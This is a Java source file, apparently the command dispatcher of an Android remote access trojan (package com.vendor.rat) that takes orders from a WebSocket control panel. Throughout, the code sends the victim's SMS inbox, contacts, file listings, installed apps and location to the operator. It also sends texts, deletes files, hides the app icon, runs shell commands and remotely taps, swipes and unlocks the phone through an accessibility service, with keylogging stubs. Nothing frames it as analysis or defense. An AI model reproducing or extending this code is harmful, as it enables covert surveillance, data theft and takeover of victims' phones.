package com.vendor.rat.control.handler;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Path;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import com.vendor.rat.MainApplication;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.CommandHandler;
import com.vendor.rat.service.MyAccessibilityService;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * 指令分发器 (唯一的 WebSocket CommandListener)
 *
 * 路由逻辑:
 *   type="screencomd" → dispatchScreenCommand (Laravel PanelSendHandler 命令)
 *   type="engine"     → CommandHandler (引擎控制命令)
 *   type=数字         → 旧格式兼容 (本地 HttpCommandServer)
 */
public class CommandDispatcher implements WebSocketClient.CommandListener {

    private static final String TAG = "CommandDispatcher";

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;
    private ShellCommandHandler shellCommandHandler;
    private FileTransferHandler fileTransferHandler;
    private CommandHandler engineHandler;

    public CommandDispatcher() {
        screenshotHandler = new ScreenshotHandler();
        audioRecordHandler = new AudioRecordHandler();
        shellCommandHandler = new ShellCommandHandler();
        fileTransferHandler = new FileTransferHandler();
    }

    /**
     * 注册到 WebSocket 客户端 (唯一入口)
     */
    public void register() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null) {
            wsClient.setCommandListener(this);
        }
    }

    /**
     * 设置引擎命令处理器 (委托给 CommandHandler)
     */
    public void setEngineHandler(CommandHandler handler) {
        this.engineHandler = handler;
    }

    @Override
    public void onCommand(String type, String subc, JsonObject json) {
        try {
            // Laravel PanelSendHandler 下发: type="screencomd", subc="Screen/SMS/..."
            if ("screencomd".equals(type)) {
                dispatchScreenCommand(subc, json);
                return;
            }

            // Laravel PanelHandler 下发: type="screen", subc="nav/mov/paste/block/..."
            if ("screen".equals(type)) {
                dispatchScreenAction(subc, json);
                return;
            }

            // Laravel PanelHandler: type="mic", subc="ON/OFF"
            if ("mic".equals(type)) {
                Log.d(TAG, "mic command: subc=" + subc);
                // TODO: 麦克风录音模块
                return;
            }

            // 兼容旧数字 type 格式 (来自本地 HttpCommandServer)
            if (json.has("type") && json.get("type").isJsonPrimitive()) {
                try {
                    int numType = json.get("type").getAsInt();
                    switch (numType) {
                        case 10: screenshotHandler.handle(json); break;
                        case 11: audioRecordHandler.handle(json); break;
                        case 12: // fall through
                        case 13: fileTransferHandler.handle(json); break;
                        case 14: shellCommandHandler.handle(json); break;
                        default:
                            Log.w(TAG, "Unknown numeric command type: " + numType);
                    }
                    return;
                } catch (NumberFormatException ignored) {
                    // type is string, not number — fall through
                }
            }

            // 引擎控制命令 → 委托给 CommandHandler
            if ("engine".equals(type) || (json.has("cmd") && !json.get("cmd").getAsString().isEmpty())) {
                if (engineHandler != null) {
                    engineHandler.onCommand(type, subc, json);
                }
                return;
            }

            Log.w(TAG, "Unhandled command: type=" + type + ", subc=" + subc);
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch command", e);
        }
    }

    /**
     * 分发 Laravel screencomd 命令
     * 对齐 PanelSendHandler 的 30+ 个命令
     */
    private void dispatchScreenCommand(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screencomd with null subc");
            return;
        }
        Log.d(TAG, "screencomd: subc=" + subc);

        switch (subc) {
            // 投屏/截图
            case "Screen":      screenshotHandler.handle(payload); break;
            case "out":         screenshotHandler.handle(payload); break;

            // 短信
            case "SMS":         handleFetchSms(); break;
            case "SMSSEND":     handleSendSms(payload); break;

            // 联系人
            case "Contacts":    handleFetchContacts(); break;

            // 文件
            case "files":       handleFetchFiles(payload); break;
            case "viewfile":    handleViewFile(payload); break;
            case "changefiles": handleChangeFiles(payload); break;

            // 应用
            case "LOADAPPS":    handleLoadApps(); break;
            case "OPENAPP":     handleOpenApp(payload); break;
            case "UNINSTALLAPP":handleUninstallApp(payload); break;

            // 键盘记录
            case "Keylog":      handleKeylog(payload); break;
            case "Logdate":     handleLogdate(payload); break;

            // 定位
            case "Location":    handleFetchLocation(); break;
            case "Locationoff": Log.d(TAG, "Location off"); break;

            // 相机
            case "Camera":      Log.d(TAG, "Camera: " + payload); break;
            case "CameraOff":   Log.d(TAG, "Camera off"); break;

            // 隐藏图标
            case "Hideico":     handleHideIcon(); break;

            // 重命名
            case "Rename":      handleRename(payload); break;

            // 弹窗
            case "DIAO":        Log.d(TAG, "Dialog: " + payload); break;

            // 文件搜索
            case "srch":        handleFileSearch(payload); break;

            // 文件复制
            case "cocu":        Log.d(TAG, "Copy: " + payload); break;

            // 聊天
            case "chat":        Log.d(TAG, "Chat: " + payload); break;

            // 获取文件
            case "fetch":       handleFetchFiles(payload); break;

            // 显示控制
            case "display":     Log.d(TAG, "Display: " + payload); break;

            default:
                Log.d(TAG, "screencomd not yet handled: " + subc);
        }
    }

    /**
     * 分发 Laravel PanelHandler screen 操作命令
     * 对齐 PanelHandler.handleScreenCommand() 的 type="screen" 命令
     *
     * 格式: {"type":"screen", "subc":"nav/mov/paste/block/...", ...fields}
     */
    private void dispatchScreenAction(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screen action with null subc");
            return;
        }
        Log.d(TAG, "screen action: subc=" + subc);

        switch (subc) {
            case "nav":
                handleNav(payload);
                break;
            case "mov":
                handleMov(payload);
                break;
            case "snap":
                handleSnap(payload);
                break;
            case "paste":
                handlePaste(payload);
                break;
            case "block":
                Log.d(TAG, "block: " + payload.toString());
                // TODO: 黑屏遮罩 (需要 WindowManager overlay)
                break;
            case "vol":
                handleVolume(payload);
                break;
            case "kb":
                Log.d(TAG, "keyboard: " + payload.toString());
                // TODO: 键盘显示/隐藏控制
                break;
            case "L":
                handleLock(payload);
                break;
            case "Q":
                handleQuality(payload);
                break;
            case "out":
                screenshotHandler.handle(payload);
                break;
            default:
                Log.d(TAG, "screen action not yet handled: " + subc);
        }
    }

    /**
     * 导航 / 点亮屏幕
     * "ho" → 点亮屏幕 (WAKEUP), "bak" → 返回, "rec" → 多任务
     */
    private void handleNav(JsonObject payload) {
        String nav = ScreenActionParser.getNav(payload);
        NavAction action = NavAction.fromShortcut(nav);
        Log.d(TAG, "nav: " + nav + " → " + action);

        switch (action) {
            case WAKE_SCREEN:
                wakeScreen();
                break;
            case BACK:
            case RECENTS:
                MyAccessibilityService service = MyAccessibilityService.P();
                if (service == null) {
                    Log.w(TAG, "nav: AccessibilityService not available");
                    return;
                }
                int globalAction = (action == NavAction.BACK)
                    ? AccessibilityService.GLOBAL_ACTION_BACK
                    : AccessibilityService.GLOBAL_ACTION_RECENTS;
                service.performGlobalAction(globalAction);
                break;
            default:
                Log.w(TAG, "nav: unknown nav=" + nav);
        }
    }

    /**
     * 点亮屏幕 (不是 HOME)
     */
    private void wakeScreen() {
        try {
            Context ctx = getAppContext();
            if (ctx == null) return;
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE,
                    "vendor:wakescreen");
                wl.acquire(3000);
                wl.release();
                Log.d(TAG, "wakeScreen: screen turned on");
            }
        } catch (Exception e) {
            Log.w(TAG, "wakeScreen failed", e);
        }
    }

    /**
     * 触摸/滑动操作
     * movetype: "0"=点击, "1"=滑动, "2"=长按
     *
     * 点击/长按: poi = {"x":100,"y":200} (JSON 对象)
     * 滑动:     poi = "(x1,y1):(x2,y2)" (字符串)
     */
    private void handleMov(JsonObject payload) {
        String movetype = payload.has("movetype") ? payload.get("movetype").getAsString() : "";
        Log.d(TAG, "mov: movetype=" + movetype);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "mov: AccessibilityService not available");
            return;
        }

        switch (movetype) {
            case "0": // 点击
                handleTap(service, payload);
                break;
            case "1": // 滑动
                handleSwipe(service, payload);
                break;
            case "2": // 长按
                handleLongPress(service, payload);
                break;
            default:
                Log.w(TAG, "mov: unknown movetype=" + movetype);
        }
    }

    private void handleTap(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "tap: x=" + coords[0] + ", y=" + coords[1]);
    }

    private void handleSwipe(AccessibilityService service, JsonObject payload) {
        // poi 格式: "(x1,y1):(x2,y2)" 或 "(x1,y1):(x2,y2):(x3,y3)"
        String poi = "";
        if (payload.has("poi")) {
            poi = payload.get("poi").isJsonPrimitive()
                ? payload.get("poi").getAsString()
                : payload.get("poi").toString();
        }

        // 解析 (x,y):(x,y) 格式
        String[] points = poi.split(":");
        if (points.length < 2) {
            Log.w(TAG, "swipe: invalid poi=" + poi);
            return;
        }

        int[] start = parsePoint(points[0]);
        int[] end = parsePoint(points[points.length - 1]);
        if (start == null || end == null) return;

        Path path = new Path();
        path.moveTo(start[0], start[1]);
        path.lineTo(end[0], end[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "swipe: " + start[0] + "," + start[1] + " → " + end[0] + "," + end[1]);
    }

    private void handleLongPress(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 1000))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "longpress: x=" + coords[0] + ", y=" + coords[1]);
    }

    /**
     * 解析 poi JSON 对象 {"x":100,"y":200}
     */
    private int[] parsePoiObject(JsonObject payload) {
        try {
            if (payload.has("poi") && payload.get("poi").isJsonObject()) {
                JsonObject poi = payload.getAsJsonObject("poi");
                int x = poi.get("x").getAsInt();
                int y = poi.get("y").getAsInt();
                return new int[]{x, y};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoiObject failed", e);
        }
        return null;
    }

    /**
     * 解析 "(x,y)" 格式的坐标字符串
     */
    private int[] parsePoint(String point) {
        try {
            String clean = point.replaceAll("[()]", "").trim();
            String[] parts = clean.split(",");
            if (parts.length >= 2) {
                return new int[]{Integer.parseInt(parts[0].trim()), Integer.parseInt(parts[1].trim())};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoint failed: " + point, e);
        }
        return null;
    }

    /**
     * 截图 (单次)
     * 格式: {"type":"screen", "subc":"snap", "snaptype":"1"}
     */
    private void handleSnap(JsonObject payload) {
        // 复用 screenshotHandler，构造 SM 命令
        JsonObject cmd = new JsonObject();
        cmd.addProperty("comdtype", "SM");
        screenshotHandler.handle(cmd);
    }

    /**
     * 粘贴文本到当前焦点
     * 格式: {"type":"screen", "subc":"paste", "txt":"hello"}
     */
    private void handlePaste(JsonObject payload) {
        String txt = payload.has("txt") ? payload.get("txt").getAsString() : "";
        Log.d(TAG, "paste: length=" + txt.length());

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null || txt.isEmpty()) return;

        // 设置剪贴板
        ClipboardManager clipboard = (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText("paste", txt));
        }

        // 通过无障碍服务粘贴到当前焦点节点
        android.view.accessibility.AccessibilityNodeInfo focus = service.findFocus(
            android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null) {
            Bundle args = new Bundle();
            args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, txt);
            focus.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            focus.recycle();
            Log.d(TAG, "paste: text set via ACTION_SET_TEXT");
        } else {
            Log.w(TAG, "paste: no input focus found, text copied to clipboard");
        }
    }

    /**
     * 音量控制
     * volstate=0 → 增加音量, volstate=1 → 减少音量
     */
    private void handleVolume(JsonObject payload) {
        String volstate = ScreenActionParser.getVolstate(payload);
        VolumeAction action = VolumeAction.fromState(volstate);
        Log.d(TAG, "volume: volstate=" + volstate + " → " + action);

        try {
            Context ctx = getAppContext();
            if (ctx == null) return;

            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;

            switch (action) {
                case UP:
                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
                    break;
                case DOWN:
                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
                    break;
                default:
                    Log.w(TAG, "volume: unknown action");
            }
        } catch (Exception e) {
            Log.w(TAG, "volume control failed", e);
        }
    }

    /**
     * 锁屏/解锁控制
     * lock=1 → 锁屏, lock=0 → 解锁 (点亮屏幕 + 上滑)
     */
    private void handleLock(JsonObject payload) {
        String lock = ScreenActionParser.getLock(payload);
        LockAction action = LockAction.fromState(lock);
        Log.d(TAG, "lock: " + lock + " → " + action);

        switch (action) {
            case LOCK:
                MyAccessibilityService lockService = MyAccessibilityService.P();
                if (lockService != null) {
                    lockService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                }
                break;
            case UNLOCK:
                // 1. 先点亮屏幕
                wakeScreen();
                // 2. 延迟 500ms 后上滑解锁
                new Thread(() -> {
                    try {
                        Thread.sleep(500);
                        MyAccessibilityService service = MyAccessibilityService.P();
                        if (service == null) return;
                        int w = service.getResources().getDisplayMetrics().widthPixels;
                        int h = service.getResources().getDisplayMetrics().heightPixels;
                        Path path = new Path();
                        path.moveTo(w / 2f, h * 0.8f);
                        path.lineTo(w / 2f, h * 0.2f);
                        GestureDescription gesture = new GestureDescription.Builder()
                            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
                            .build();
                        service.dispatchGesture(gesture, null, null);
                        Log.d(TAG, "unlock: swipe up dispatched");
                    } catch (Exception e) {
                        Log.w(TAG, "unlock gesture failed", e);
                    }
                }).start();
                break;
            default:
                Log.w(TAG, "lock: unknown action");
        }
    }

    /**
     * 投屏画质调整
     * 格式: {"type":"screen", "subc":"Q", "newq":"30"}
     */
    private void handleQuality(JsonObject payload) {
        String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
        Log.d(TAG, "quality: " + newq);
        // TODO: 调整 ScreenshotHandler 的 JPEG_QUALITY 和 SCALE_FACTOR
    }

    // ============ PanelSendHandler screencomd 数据采集命令 ============

    private Context getAppContext() {
        MainApplication app = MainApplication.getInstance();
        return (app != null && app.getApplication() != null) ? app.getApplication() : null;
    }

    private WebSocketClient getWsClient() {
        return NetworkManager.getInstance().getWebSocketClient();
    }

    /**
     * 获取短信列表 → subc="sms"
     */
    private void handleFetchSms() {
        Log.d(TAG, "fetchSms");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                JsonArray arr = new JsonArray();
                Cursor cursor = ctx.getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 200");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JsonObject sms = new JsonObject();
                        sms.addProperty("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.addProperty("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.addProperty("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                        sms.addProperty("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                        arr.add(sms);
                    }
                    cursor.close();
                }
                ws.sendData("sms", arr.toString());
                Log.d(TAG, "sms sent: " + arr.size() + " messages");
            } catch (Exception e) {
                Log.w(TAG, "fetchSms failed", e);
            }
        }).start();
    }

    /**
     * 发送短信
     * 格式: {"type":"screencomd", "subc":"SMSSEND", "smsnumber":"xxx", "message":"xxx"}
     */
    private void handleSendSms(JsonObject payload) {
        String number = payload.has("smsnumber") ? payload.get("smsnumber").getAsString() : "";
        String message = payload.has("message") ? payload.get("message").getAsString() : "";
        Log.d(TAG, "sendSms: to=" + number);
        if (number.isEmpty() || message.isEmpty()) return;

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            Log.d(TAG, "sms sent to " + number);
        } catch (Exception e) {
            Log.w(TAG, "sendSms failed", e);
        }
    }

    /**
     * 获取联系人列表 → subc="loadcontacts"
     */
    private void handleFetchContacts() {
        Log.d(TAG, "fetchContacts");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                JsonArray arr = new JsonArray();
                Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    }, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JsonObject contact = new JsonObject();
                        contact.addProperty("name", cursor.getString(0));
                        contact.addProperty("phone", cursor.getString(1));
                        arr.add(contact);
                    }
                    cursor.close();
                }
                ws.sendData("loadcontacts", arr.toString());
                Log.d(TAG, "contacts sent: " + arr.size());
            } catch (Exception e) {
                Log.w(TAG, "fetchContacts failed", e);
            }
        }).start();
    }

    /**
     * 获取文件列表 → subc="files"
     * 格式: {"type":"screencomd", "subc":"files", "filepath":"/sdcard/"}
     */
    private void handleFetchFiles(JsonObject payload) {
        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "/sdcard";
        if (payload.has("fpath")) filepath = payload.get("fpath").getAsString();
        Log.d(TAG, "fetchFiles: " + filepath);
        WebSocketClient ws = getWsClient();
        if (ws == null) return;

        final String path = filepath;
        new Thread(() -> {
            try {
                File dir = new File(path);
                JsonArray arr = new JsonArray();
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            JsonObject item = new JsonObject();
                            item.addProperty("name", f.getName());
                            item.addProperty("path", f.getParent());
                            item.addProperty("size", String.valueOf(f.length()));
                            item.addProperty("isDirectory", f.isDirectory());
                            item.addProperty("lastModified",
                                new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(f.lastModified())));
                            arr.add(item);
                        }
                    }
                }
                ws.sendData("files", arr.toString());
                Log.d(TAG, "files sent: " + arr.size() + " items from " + path);
            } catch (Exception e) {
                Log.w(TAG, "fetchFiles failed", e);
            }
        }).start();
    }

    /**
     * 查看文件内容 (缩略图) → subc="thumb"
     */
    private void handleViewFile(JsonObject payload) {
        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "";
        Log.d(TAG, "viewFile: " + filepath);
        // TODO: 读取文件生成缩略图 → ws.sendThumb(data, path)
    }

    /**
     * 文件操作 (上传/删除/下载)
     */
    private void handleChangeFiles(JsonObject payload) {
        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "";
        Log.d(TAG, "changeFiles: comdtype=" + comdtype + ", path=" + filepath);

        if ("R".equals(comdtype) && !filepath.isEmpty()) {
            // 删除文件
            try {
                File f = new File(filepath);
                if (f.exists()) {
                    boolean deleted = f.delete();
                    Log.d(TAG, "file deleted: " + filepath + " = " + deleted);
                }
            } catch (Exception e) {
                Log.w(TAG, "deleteFile failed", e);
            }
        }
        // TODO: D=下载 → 读取文件 → ws.sendFileChunk()
        // TODO: U=上传 → 接收分块数据 → 写入文件
    }

    /**
     * 获取应用列表 → subc="loadapps"
     */
    private void handleLoadApps() {
        Log.d(TAG, "loadApps");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JsonArray arr = new JsonArray();
                for (ApplicationInfo app : apps) {
                    // 只返回用户安装的应用
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    JsonObject item = new JsonObject();
                    item.addProperty("name", pm.getApplicationLabel(app).toString());
                    item.addProperty("packageName", app.packageName);
                    arr.add(item);
                }
                ws.sendData("loadapps", arr.toString());
                Log.d(TAG, "apps sent: " + arr.size());
            } catch (Exception e) {
                Log.w(TAG, "loadApps failed", e);
            }
        }).start();
    }

    /**
     * 打开应用
     * 格式: {"type":"screencomd", "subc":"OPENAPP", "package":"com.example.app"}
     */
    private void handleOpenApp(JsonObject payload) {
        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
        Log.d(TAG, "openApp: " + pkg);
        Context ctx = getAppContext();
        if (ctx == null || pkg.isEmpty()) return;

        try {
            Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.w(TAG, "openApp failed", e);
        }
    }

    /**
     * 卸载应用
     * 格式: {"type":"screencomd", "subc":"UNINSTALLAPP", "package":"com.example.app"}
     */
    private void handleUninstallApp(JsonObject payload) {
        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
        Log.d(TAG, "uninstallApp: " + pkg);
        Context ctx = getAppContext();
        if (ctx == null || pkg.isEmpty()) return;

        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.w(TAG, "uninstallApp failed", e);
        }
    }

    /**
     * 键盘记录开关
     * 格式: {"type":"screencomd", "subc":"Keylog", "comdtype":"0"=开/"1"=关}
     */
    private void handleKeylog(JsonObject payload) {
        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
        Log.d(TAG, "keylog: comdtype=" + comdtype);
        // TODO: 开启/关闭无障碍服务的键盘事件监听
    }

    /**
     * 键盘日志日期查询
     */
    private void handleLogdate(JsonObject payload) {
        String kdate = payload.has("kdate") ? payload.get("kdate").getAsString() : "";
        Log.d(TAG, "logdate: " + kdate);
        // TODO: 查询指定日期的键盘日志 → ws.sendData("klogsdate", data)
    }

    /**
     * 获取位置 → subc="loc"
     */
    private void handleFetchLocation() {
        Log.d(TAG, "fetchLocation");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;

            Location loc = null;
            // 优先 GPS，备选 Network
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (loc != null) {
                JsonObject data = new JsonObject();
                data.addProperty("lat", loc.getLatitude());
                data.addProperty("lng", loc.getLongitude());
                data.addProperty("accuracy", loc.getAccuracy());
                data.addProperty("provider", loc.getProvider());
                data.addProperty("time", loc.getTime());
                ws.sendData("loc", data.toString());
                Log.d(TAG, "location sent: " + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                ws.sendData("loc", "{}");
                Log.w(TAG, "location: no last known location");
            }
        } catch (SecurityException e) {
            Log.w(TAG, "fetchLocation: no permission", e);
        } catch (Exception e) {
            Log.w(TAG, "fetchLocation failed", e);
        }
    }

    /**
     * 隐藏图标
     */
    private void handleHideIcon() {
        Log.d(TAG, "hideIcon");
        Context ctx = getAppContext();
        if (ctx == null) return;

        try {
            PackageManager pm = ctx.getPackageManager();
            pm.setComponentEnabledSetting(
                new android.content.ComponentName(ctx, "com.vendor.rat.activity.ActivMain"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "icon hidden");
        } catch (Exception e) {
            Log.w(TAG, "hideIcon failed", e);
        }
    }

    /**
     * 重命名设备
     * 格式: {"type":"screencomd", "subc":"Rename", "name":"新名称"}
     */
    private void handleRename(JsonObject payload) {
        String name = payload.has("name") ? payload.get("name").getAsString() : "";
        Log.d(TAG, "rename: " + name);
        // 重命名通过下次心跳的 phone_name 字段生效
        // TODO: 持久化到 SharedPreferences
    }

    /**
     * 文件搜索
     * 格式: {"type":"screencomd", "subc":"srch", "srchfor":"*.jpg", "srchin":"/sdcard/", "targetpath":"/sdcard/DCIM"}
     */
    private void handleFileSearch(JsonObject payload) {
        String searchFor = payload.has("srchfor") ? payload.get("srchfor").getAsString() : "";
        String searchIn = payload.has("srchin") ? payload.get("srchin").getAsString() : "/sdcard";
        Log.d(TAG, "fileSearch: for=" + searchFor + ", in=" + searchIn);
        WebSocketClient ws = getWsClient();
        if (ws == null || searchFor.isEmpty()) return;

        new Thread(() -> {
            try {
                JsonArray paths = new JsonArray();
                searchFilesRecursive(new File(searchIn), searchFor, paths, 500);
                ws.sendSearchResult(paths.toString(), searchFor);
                Log.d(TAG, "search results: " + paths.size());
            } catch (Exception e) {
                Log.w(TAG, "fileSearch failed", e);
            }
        }).start();
    }

    private void searchFilesRecursive(File dir, String pattern, JsonArray results, int limit) {
        if (!dir.exists() || !dir.isDirectory() || results.size() >= limit) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        String lowerPattern = pattern.replace("*", "").toLowerCase();
        for (File f : files) {
            if (results.size() >= limit) return;
            if (f.isDirectory()) {
                searchFilesRecursive(f, pattern, results, limit);
            } else if (f.getName().toLowerCase().contains(lowerPattern)) {
                results.add(f.getAbsolutePath());
            }
        }
    }
}
